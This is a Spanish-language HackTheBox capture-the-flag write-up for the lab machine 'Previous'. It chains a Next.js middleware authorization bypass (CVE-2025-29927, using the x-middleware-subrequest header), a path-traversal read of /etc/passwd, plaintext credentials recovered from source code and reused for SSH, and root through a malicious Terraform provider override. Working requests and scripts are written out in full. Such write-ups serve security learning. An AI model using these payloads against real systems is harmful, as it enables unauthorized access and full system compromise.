@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Previous | ZsZsec</title>
+<meta content="Bypass de middleware en Next.js, LFI, exposición de código fuente, reutilización de credenciales y Terraform como vector de root." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">HackTheBox</p>
+<h1>Previous<span>_</span></h1>
+<div class="writeup-meta"><span>HackTheBox / Next.js / LFI</span></div>
+<div class="tag-row"><span class="tag">HackTheBox</span><span class="tag">Next.js</span><span class="tag">LFI</span><span class="tag">Terraform</span><span class="tag">Linux</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body"><h2>Enumeración Inicial</h2>
+<p>Iniciamos la fase de reconocimiento realizando un <strong>escaneo básico con Nmap</strong>, con el objetivo de identificar puertos abiertos en el host objetivo.</p>
+<pre><code class="language-bash">┌──(zikuta㉿zikuta)-[~/Desktop/htb/previous]
+└─$ cat basico               
+# Nmap 7.95 scan initiated Thu Jan 15 10:19:14 2026 as: /usr/lib/nmap/nmap --privileged -p- -sS -Pn -f --min-rate 3500 -oN basico 10.129.242.162
+Warning: 10.129.242.162 giving up on port because retransmission cap hit (10).
+Nmap scan report for previous.htb (10.129.242.162)
+Host is up (0.14s latency).
+Not shown: 63465 closed tcp ports (reset), 2068 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http                             
+</code></pre>
+<p>Resultado del escaneo:</p>
+<p><code>PORT   STATE SERVICE 22/tcp open  ssh 80/tcp open  http</code></p>
+<p>El host responde correctamente y únicamente expone los servicios <strong>SSH (22)</strong> y <strong>HTTP (80)</strong>, reduciendo la superficie de ataque inicial.</p>
+<h2>Enumeración Exhaustiva de Servicios</h2>
+<p>Con los puertos identificados, procedemos a realizar un <strong>escaneo más detallado</strong> sobre los servicios descubiertos, utilizando detección de versiones y scripts por defecto.</p>
+<pre><code class="language-bash">┌──(zikuta㉿zikuta)-[~/Desktop/htb/previous]
+└─$ cat exhaustivo 
+# Nmap 7.95 scan initiated Thu Jan 15 10:16:13 2026 as: /usr/lib/nmap/nmap --privileged -p22,80 -sC -sV -Pn -f -oN exhaustivo 10.129.242.162
+Nmap scan report for 10.129.242.162
+Host is up (0.68s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://previous.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Jan 15 10:16:38 2026 -- 1 IP address (1 host up) scanned in 25.62 seconds
+                                                 
+</code></pre>
+<p>Resultados relevantes:</p>
+<p><code>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 80/tcp open  http    nginx 1.18.0 (Ubuntu)</code></p>
+<p>Además, Nmap indica un <strong>redireccionamiento HTTP</strong> hacia el dominio:</p>
+<p><code>http://previous.htb/</code></p>
+<p>Por lo tanto, identificamos:</p>
+<ul>
+<li>Sistema operativo: <strong>Ubuntu Linux</strong></li>
+<li>Servidor web: <strong>nginx 1.18.0</strong></li>
+<li>Dominio virtual configurado: <strong>previous.htb</strong></li>
+</ul>
+<p>Se procede a añadir el dominio al archivo <code>/etc/hosts</code> para una correcta resolución local.</p>
+<h2>Reconocimiento Web</h2>
+<h3>Identificación de tecnologías</h3>
+<p>Con el dominio configurado, realizamos un reconocimiento inicial del stack web utilizando <code>whatweb</code>.</p>
+<p><img alt="Pasted image 20260115171050" src="https://github.com/user-attachments/assets/c5a12aab-1cc4-4d5e-a647-ee08817d2640"/>
+Salida relevante:</p>
+<p><code>Email[jeremy@previous.htb] X-Powered-By[Next.js] HTTPServer[nginx/1.18.0 (Ubuntu)] Script[application/json]</code></p>
+<p>A partir de esta información podemos destacar:</p>
+<ul>
+<li>Uso de <strong>Next.js</strong>, lo cual sugiere una aplicación moderna basada en React.</li>
+<li>Presencia de un <strong>posible usuario válido</strong>: <code>jeremy</code>.</li>
+<li>Backend servido por <strong>nginx</strong> sobre Ubuntu.</li>
+</ul>
+<p>vemos un posible usuario <code>jeremy</code> y tambien vemos  <code>X-Powered-By[Next.js]</code></p>
+<h3>Enumeración de rutas</h3>
+<p>Se realizó fuzzing de directorios con <code>feroxbuster</code>, sin encontrar rutas sensibles o contenido expuesto adicional.</p>
+<p>No obstante, al interactuar manualmente con la aplicación web, se observan dos botones principales:</p>
+<ul>
+<li><strong>Docs</strong></li>
+<li><strong>Get Started</strong></li>
+</ul>
+<p>Ambos redirigen a un <strong>formulario de autenticación</strong>, cuya URL es la siguiente:</p>
+<pre><code class="language-bash">http://previous.htb/api/auth/signin?callbackUrl=%2Fdocs
+</code></pre>
+<p>Esto confirma el uso del sistema de autenticación <strong>NextAuth</strong>, comúnmente utilizado junto a Next.js.</p>
+<p><img alt="Pasted image 20260115171801" src="https://github.com/user-attachments/assets/cba4fd83-eb5e-44f6-acd1-b4edbc64fd80"/></p>
+<h2>Análisis de Autenticación</h2>
+<p>Con el objetivo de analizar el flujo de autenticación, interceptamos la petición utilizando <strong>Burp Suite</strong>.</p>
+<p>Petición capturada:</p>
+<pre><code class="language-bash">GET /api/auth/signin?callbackUrl=%2Fdocs HTTP/1.1
+
+Host: previous.htb
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Connection: keep-alive
+
+Cookie: next-auth.csrf-token=bca53cd64c99ed73c03a2baf1e993f01dacbd7c46ec2adb443fef1977a9d271b%7Cc81b735c87db086b7760855f375421a0fa4fb48288813b52fb174230c5d85e32; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000
+
+Upgrade-Insecure-Requests: 1
+
+Priority: u=0, i
+</code></pre>
+<p>Aquí observamos varios elementos clave:</p>
+<ul>
+<li>Uso de <strong>CSRF tokens</strong> (<code>next-auth.csrf-token</code>)</li>
+<li>Cookie de redirección (<code>next-auth.callback-url</code>)</li>
+<li>Arquitectura típica de <strong>NextAuth + JWT</strong></li>
+</ul>
+<hr/>
+<h2>Análisis de Autenticación y Middleware (Next.js)</h2>
+<p>Durante el análisis de la funcionalidad de autenticación, se observó que al intentar acceder a recursos protegidos como <code>/docs</code>, la aplicación redirige automáticamente al endpoint de inicio de sesión de NextAuth:</p>
+<p><code>http://previous.htb/api/auth/signin?callbackUrl=%2Fdocs</code></p>
+<p>Esto indica que la aplicación utiliza <strong>Next.js junto con NextAuth</strong> para gestionar la autenticación y el control de acceso.</p>
+<p>Al interceptar la petición con <strong>Burp Suite</strong>, se identificó un comportamiento relevante en las cookies enviadas al servidor:</p>
+<p><code>Cookie:  next-auth.csrf-token=... next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000</code></p>
+<p>La cookie <code>next-auth.callback-url</code> apunta a un recurso interno (<code>localhost:3000</code>), lo que sugiere que la aplicación confía en valores controlables por el cliente para gestionar redirecciones posteriores al proceso de autenticación.</p>
+<hr/>
+<h2>Relación con Next.js Middleware</h2>
+<p>Next.js implementa <strong>Middleware</strong> como una capa que se ejecuta <strong>antes de que la petición llegue a la lógica principal de la aplicación</strong>. Este middleware suele utilizarse para:</p>
+<ul>
+<li>Autenticación</li>
+<li>Autorización</li>
+<li>Redirecciones</li>
+<li>Protección de rutas sensibles</li>
+</ul>
+<p>En este caso, el acceso a <code>/docs</code> depende de una validación realizada en el middleware. Sin embargo, este mecanismo resultó vulnerable debido a una validación incorrecta de los encabezados y cookies asociados a la sesión.</p>
+<hr/>
+<h2>Vulnerabilidad Identificada</h2>
+<h3>CVE-2025-29927 – Next.js Middleware Authorization Bypass</h3>
+<p>La aplicación resulta vulnerable a <strong>CVE-2025-29927</strong>, una vulnerabilidad crítica en <strong>Next.js Middleware</strong> que permite <strong>eludir controles de autorización</strong>.</p>
+<p>Esta vulnerabilidad ocurre cuando el middleware confía en encabezados o estados manipulables por el cliente (como cookies o headers internos) para determinar si un usuario está autenticado, permitiendo que solicitudes especialmente construidas <strong>bypassen completamente la lógica de autenticación</strong>.</p>
+<p>Según la documentación oficial de Next.js:</p>
+<blockquote>
+<p><em>“Middleware allows you to run code before a request is completed. Based on the incoming request, you can modify the response by rewriting, redirecting, modifying headers, or responding directly.”</em></p>
+</blockquote>
+<p>En este escenario, la validación de acceso a rutas protegidas como <code>/docs</code> se realiza únicamente en el middleware, lo que permite explotar la vulnerabilidad para acceder a recursos restringidos <strong>sin credenciales válidas</strong>.</p>
+<hr/>
+<h2>Bypass de Autenticación mediante Next.js Middleware</h2>
+<h3>CVE-2025-29927</h3>
+<p>Teniendo en cuenta que la aplicación utiliza <strong>Next.js Middleware</strong> para proteger rutas como <code>/docs</code>, se procedió a comprobar si dicha validación podía ser eludida.</p>
+<p>Para ello, se eliminan completamente las cookies de sesión (<code>next-auth.*</code>) y el token CSRF de la petición original, y se construye manualmente una solicitud directa a la ruta protegida <code>/docs</code>, añadiendo el encabezado especial <code>x-middleware-subrequest</code>.</p>
+<hr/>
+<h3>Petición manipulada</h3>
+<pre><code class="language-http">GET /docs HTTP/1.1 Host: previous.htb x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Priority: u=0, i`
+</code></pre>
+<p><img alt="Pasted image 20260115173122" src="https://github.com/user-attachments/assets/7193a662-a476-4fdd-91f9-8917ef0d9956"/></p>
+<hr/>
+<h3>Respuesta del servidor</h3>
+<pre><code class="language-http">HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) X-Powered-By: Next.js Content-Type: text/html; charset=utf-8`
+</code></pre>
+<p><img alt="Pasted image 20260115173241" src="https://github.com/user-attachments/assets/7703a710-ca9d-4a83-9092-bcdcc45d9e1d"/></p>
+<p>El servidor responde correctamente con un <strong>HTTP 200 OK</strong>, devolviendo el contenido completo de la página <code>/docs</code>, a pesar de que:</p>
+<ul>
+<li>No se enviaron cookies de autenticación</li>
+<li>No se proporcionó ningún token CSRF</li>
+<li>El usuario no inició sesión previamente</li>
+</ul>
+<p>Esto confirma que el control de acceso fue completamente eludido.</p>
+<hr/>
+<h3>Explicación técnica del bypass</h3>
+<p>La vulnerabilidad <strong>CVE-2025-29927</strong> se produce cuando el middleware de Next.js confía en el encabezado interno <code>x-middleware-subrequest</code> para determinar si una petición ya ha sido procesada por el middleware.</p>
+<p>Al enviar múltiples valores <code>middleware:</code> en este encabezado, el framework interpreta erróneamente que la solicitud ya pasó por todas las capas de middleware, <strong>omitiendo la ejecución de las validaciones de autenticación y autorización</strong>.</p>
+<p>Como resultado, la petición accede directamente a la ruta protegida sin ningún tipo de control de sesión.</p>
+<hr/>
+<h3>Evidencia de acceso no autorizado</h3>
+<p>El contenido devuelto corresponde a la documentación interna de la aplicación, incluyendo:</p>
+<ul>
+<li>Navegación completa de <code>/docs</code></li>
+<li>Recursos JavaScript internos (<code>/_next/static/...</code>)</li>
+<li>Mensaje visual indicando estado de sesión:</li>
+</ul>
+<p><code>&lt;p class="text-sm text-gray-600"&gt;Logged in as &lt;b&gt;???&lt;/b&gt;&lt;/p&gt;</code></p>
+<p>Esto confirma que la aplicación asume erróneamente un estado autenticado, aun cuando no existe una sesión válida.</p>
+<hr/>
+<h2>Impacto de la vulnerabilidad</h2>
+<ul>
+<li>Bypass completo de autenticación</li>
+<li>Acceso no autorizado a rutas protegidas</li>
+<li>Exposición de información interna</li>
+<li>Posible escalada de privilegios si existen funcionalidades sensibles detrás de otras rutas protegidas por middleware</li>
+</ul>
+<hr/>
+<h2>Acceso a rutas adicionales mediante bypass de middleware</h2>
+<p>Tras conseguir acceso no autenticado a <code>/docs</code>, se identificó un enlace adicional dentro de la documentación:</p>
+<pre><code class="language-http">href="/docs/examples"
+</code></pre>
+<p>Aplicando nuevamente el bypass del middleware (CVE-2025-29927), fue posible acceder sin autenticación a la ruta <code>/docs/examples</code>, confirmando que <strong>todas las rutas protegidas dependen exclusivamente del middleware vulnerable</strong>.</p>
+<p><img alt="Pasted image 20260115173607" src="https://github.com/user-attachments/assets/e82f66d3-c062-4837-9c73-80af2eb6cb24"/></p>
+<h2>Descarga de ejemplos y análisis del endpoint <code>/api/download</code></h2>
+<p>Dentro de la sección <em>Examples</em>, se observa un botón <strong>“Download the full example here!”</strong>, el cual genera la siguiente petición:</p>
+<pre><code class="language-http">GET /api/download?example=hello-world.ts HTTP/1.1
+
+Host: previous.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: http://previous.htb/docs/examples
+Cookie: next-auth.csrf-token=bca53cd64c99ed73c03a2baf1e993f01dacbd7c46ec2adb443fef1977a9d271b%7Cc81b735c87db086b7760855f375421a0fa4fb48288813b52fb174230c5d85e32; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+</code></pre>
+<p>Este comportamiento sugiere que el backend lee archivos del sistema basándose directamente en el parámetro <code>example</code>, sin validación aparente.</p>
+<h2>Local File Inclusion (LFI) mediante Path Traversal</h2>
+<p>Se procede a eliminar las cookies de sesión y a aplicar nuevamente el bypass del middleware, manipulando el parámetro <code>example</code> para intentar realizar <strong>directory traversal</strong>:</p>
+<pre><code class="language-http">GET /api/download?example=../../../../../../../etc/passwd HTTP/1.1
+
+Host: previous.htb
+x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: http://previous.htb/docs/examples
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+</code></pre>
+<p>Respuesta del servidor</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+
+Server: nginx/1.18.0 (Ubuntu)
+Date: Thu, 15 Jan 2026 22:38:03 GMT
+Content-Type: application/zip
+Content-Length: 787
+Connection: keep-alive
+Content-Disposition: attachment; filename="passwd"
+ETag: "41amqg1v4m26j"
+
+root:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+node:x:1000:1000::/home/node:/bin/sh
+nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
+</code></pre>
+<p>El contenido del archivo <code>/etc/passwd</code> es devuelto correctamente, confirmando una vulnerabilidad de <strong>Local File Inclusion (LFI)</strong>.</p>
+<p>Entre los usuarios del sistema destacan:</p>
+<pre><code class="language-bash">node:x:1000:1000::/home/node:/bin/sh
+nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
+</code></pre>
+<h2>Enumeración interna de la aplicación Next.js</h2>
+<p>Con LFI confirmado, el siguiente objetivo fue identificar archivos internos de la aplicación Next.js. Para ello, se accede al archivo:</p>
+<pre><code class="language-bash">.next/server/pages-manifest.json
+</code></pre>
+<p><img alt="Pasted image 20260115174610" src="https://github.com/user-attachments/assets/23448595-e4e3-4fc7-b1bc-b1388e7d9350"/></p>
+<h3>Respuesta</h3>
+<p>El archivo revela todas las rutas internas y su correspondencia con archivos del servidor:</p>
+<p><img alt="Pasted image 20260115174636" src="https://github.com/user-attachments/assets/07acf4ea-daaf-41b1-aa72-43a512f067f9"/></p>
+<p>Este archivo es especialmente interesante, ya que contiene la lógica de autenticación de la aplicación.</p>
+<h2>Exposición de credenciales mediante Source Code Disclosure</h2>
+<p>Se procede a descargar el archivo de autenticación de NextAuth:</p>
+<p><img alt="Pasted image 20260115174853" src="https://github.com/user-attachments/assets/2f11fb6f-6ba7-412c-a9ff-4a359f351be9"/></p>
+<h3>Respuesta</h3>
+<p>El código fuente revela un proveedor de autenticación por credenciales:</p>
+<p><img alt="Pasted image 20260115175322" src="https://github.com/user-attachments/assets/e83eedde-267a-4a4e-8018-772780441d3c"/></p>
+<p>De aquí se obtienen las siguientes credenciales:</p>
+<table>
+<thead>
+<tr>
+<th>Usuario</th>
+<th>Contraseña</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>jeremy</td>
+<td>MyNameIsJeremyAndILovePancakes</td>
+</tr>
+</tbody>
+</table>
+<h2>Acceso al sistema mediante SSH</h2>
+<p>Aunque el usuario <code>jeremy</code> no aparece en el archivo <code>/etc/passwd</code>, se intentó reutilizar las credenciales obtenidas para acceder al servicio SSH expuesto en el puerto 22.</p>
+<p><img alt="Pasted image 20260115175535" src="https://github.com/user-attachments/assets/78dabe1c-749b-4f41-82df-cd7d9cf88303"/></p>
+<p>La autenticación fue exitosa, confirmando que las credenciales de la aplicación web <strong>fueron reutilizadas a nivel de sistema</strong>, permitiendo obtener acceso interactivo al servidor.</p>
+<h1>Escalada de Privilegios</h1>
+<h2>Enumeración de privilegios sudo</h2>
+<p>Una vez obtenido acceso como el usuario <code>jeremy</code>, se procede a enumerar los privilegios sudo disponibles:</p>
+<p><img alt="Pasted image 20260116014717" src="https://github.com/user-attachments/assets/f0c9107c-f03e-45b0-9885-41ca2953c300"/></p>
+<p>Esto indica que el usuario <code>jeremy</code> puede ejecutar <strong>Terraform como root</strong>, pero únicamente con el directorio de trabajo establecido en <code>/opt/examples</code> y usando el comando <code>apply</code>.</p>
+<pre><code class="language-bash">/usr/bin/terraform -chdir\=/opt/examples apply
+</code></pre>
+<h2>Análisis de la configuración Terraform</h2>
+<p>Se inspeccionan los archivos Terraform presentes en el directorio permitido:</p>
+<pre><code class="language-bash">jeremy@previous:~$ cat /opt/examples/*.tf
+terraform {
+  required_providers {
+    examples = {
+      source = "previous.htb/terraform/examples"
+    }
+  }
+}
+
+variable "source_path" {
+  type = string
+  default = "/root/examples/hello-world.ts"
+
+  validation {
+    condition = strcontains(var.source_path, "/root/examples/") &amp;&amp; !strcontains(var.source_path, "..")
+    error_message = "The source_path must contain '/root/examples/'."
+  }
+}
+
+provider "examples" {}
+
+resource "examples_example" "example" {
+  source_path = var.source_path
+}
+
+output "destination_path" {
+  value = examples_example.example.destination_path
+}
+</code></pre>
+<p>La configuración define un <strong>provider personalizado</strong> (<code>previous.htb/terraform/examples</code>), el cual es cargado dinámicamente por Terraform durante la ejecución</p>
+<h2>Abuso de Terraform Provider (Privilege Escalation)</h2>
+<p>Terraform permite utilizar proveedores locales mediante <strong>provider development overrides</strong>, una funcionalidad pensada para desarrollo y pruebas.<br/>
+Esta característica permite forzar a Terraform a cargar un proveedor desde una ruta local arbitraria.</p>
+<p>Dado que Terraform se ejecuta como <strong>root</strong> vía <code>sudo</code>, es posible abusar de este mecanismo para ejecutar código arbitrario con privilegios elevados.</p>
+<h2>Creación de proveedor malicioso</h2>
+<p>Se crea un binario falso del proveedor que simplemente asigna el bit SUID a <code>/bin/bash</code>:</p>
+<pre><code class="language-bash">jeremy@previous:~$ cat &gt; /tmp/terraform-provider-examples &lt;&lt; 'EOF'
+#!/bin/bash
+chmod +s /bin/bash
+EOF
+
+chmod +x /tmp/terraform-provider-examples
+</code></pre>
+<h2>Configuración del override del provider</h2>
+<p>A continuación, se crea un archivo de configuración de Terraform para redirigir la carga del provider legítimo hacia nuestro binario malicioso:</p>
+<pre><code class="language-bash">jeremy@previous:~$ cat &gt; /tmp/previous.rc &lt;&lt; 'EOF'                        
+provider_installation {
+  dev_overrides {
+    "previous.htb/terraform/examples" = "/tmp"
+  }
+  direct {}
+}
+EOF
+
+# Se exporta la variable de entorno necesaria para que Terraform lea esta configuración:Se exporta la variable de entorno necesaria para que Terraform lea esta configuración:
+
+export TF_CLI_CONFIG_FILE=/tmp/previous.rc
+</code></pre>
+<h2>Ejecución del exploit</h2>
+<p>Se ejecuta el comando permitido con <code>sudo</code>:</p>
+<pre><code class="language-bash">jeremy@previous:~$ sudo /usr/bin/terraform -chdir=/opt/examples apply
+</code></pre>
+<p>Durante la ejecución, Terraform intenta cargar el provider desde <code>/tmp</code>, ejecutando nuestro binario como <strong>root</strong>.</p>
+<p>Aunque Terraform muestra un error de carga del provider, el payload ya se ha ejecutado correctamente.</p>
+<pre><code class="language-bash">jeremy@previous:~$ sudo /usr/bin/terraform -chdir=/opt/examples apply
+</code></pre>
+<h2>Obtención de root</h2>
+<p>Con el bit SUID aplicado a <code>/bin/bash</code>, se obtiene una shell privilegiada:</p>
+<p><img alt="Pasted image 20260116020228" src="https://github.com/user-attachments/assets/63f8aa3f-fd47-4f34-bf89-5fba02c4ba88"/></p>
+<hr/>
+<h2>Conclusión</h2>
+<p>La máquina <strong>Previous</strong> presenta una cadena de vulnerabilidades que demuestra cómo una <strong>aplicación moderna mal configurada</strong>, basada en <strong>Next.js</strong>, puede comprometer completamente un sistema cuando se combinan fallos de diseño, errores de validación y malas prácticas de seguridad.</p>
+<p>El compromiso del sistema comienza con una correcta fase de <strong>enumeración</strong>, donde se identifican únicamente dos servicios expuestos: <strong>SSH</strong> y <strong>HTTP</strong>. A pesar de la superficie de ataque reducida, el análisis del servicio web revela el uso de <strong>Next.js junto con NextAuth</strong>, lo que dirige la investigación hacia la lógica de autenticación y middleware.</p>
+<p>La vulnerabilidad crítica <strong>CVE-2025-29927</strong> permite <strong>eludir completamente el middleware de Next.js</strong> mediante la manipulación del encabezado interno <code>x-middleware-subrequest</code>. Este fallo de diseño provoca que las rutas protegidas dependan exclusivamente del middleware para su control de acceso, permitiendo a un atacante <strong>acceder a contenido restringido sin autenticación alguna</strong>.</p>
+<p>Una vez logrado el bypass de autenticación, se accede a la documentación interna de la aplicación (<code>/docs</code>), desde donde se identifica un endpoint vulnerable (<code>/api/download</code>) que permite la descarga de archivos locales sin una validación adecuada del parámetro <code>example</code>. Esto conduce a una vulnerabilidad de <strong>Local File Inclusion (LFI)</strong> mediante <strong>Path Traversal</strong>, confirmada con la lectura exitosa de <code>/etc/passwd</code>.</p>
+<p>El LFI permite la enumeración interna de la aplicación Next.js, incluyendo archivos críticos como <code>.next/server/pages-manifest.json</code>, lo que facilita la localización del código fuente responsable de la autenticación. A partir de esta exposición de código, se obtienen <strong>credenciales en texto plano</strong> utilizadas por el proveedor de autenticación de NextAuth.</p>
+<p>Estas credenciales resultan ser reutilizadas a nivel de sistema, permitiendo el acceso interactivo por <strong>SSH</strong> como el usuario <code>jeremy</code>, evidenciando una grave mala práctica de seguridad: <strong>reutilización de credenciales entre la aplicación web y el sistema operativo</strong>.</p>
+<p>En la fase de escalada de privilegios, se identifica que el usuario <code>jeremy</code> puede ejecutar <strong>Terraform como root</strong> con restricciones aparentemente seguras. Sin embargo, el uso de un <strong>provider personalizado</strong> combinado con la funcionalidad de <strong>provider development overrides</strong> permite forzar la ejecución de un binario arbitrario como root. Este abuso culmina en la ejecución de código con privilegios elevados, logrando una shell <strong>root</strong> de manera confiable.</p>
+<p>En conclusión, la máquina demuestra cómo:</p>
+<ul>
+<li>Un <strong>bypass de autenticación</strong> en middleware</li>
+<li>Combinado con <strong>LFI</strong></li>
+<li>Derivando en <strong>exposición de código fuente</strong></li>
+<li>Reutilización de credenciales</li>
+<li>Y un <strong>mal uso de herramientas de automatización como Terraform</strong></li>
+</ul>
+<p>pueden encadenarse para comprometer completamente un sistema moderno.</p>
+<p>La máquina <strong>Previous</strong> es un excelente ejemplo de ataque <strong>realista</strong>, donde no se explotan servicios obsoletos, sino <strong>errores lógicos y de diseño</strong> en tecnologías actuales, destacando la importancia de:</p>
+<ul>
+<li>No confiar únicamente en middleware para controles de acceso</li>
+<li>Validar estrictamente entradas del usuario</li>
+<li>Proteger el código fuente</li>
+<li>Evitar reutilización de credenciales</li>
+<li>Limitar el uso de herramientas administrativas como <code>sudo</code> y Terraform</li>
+</ul>
+<hr/>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
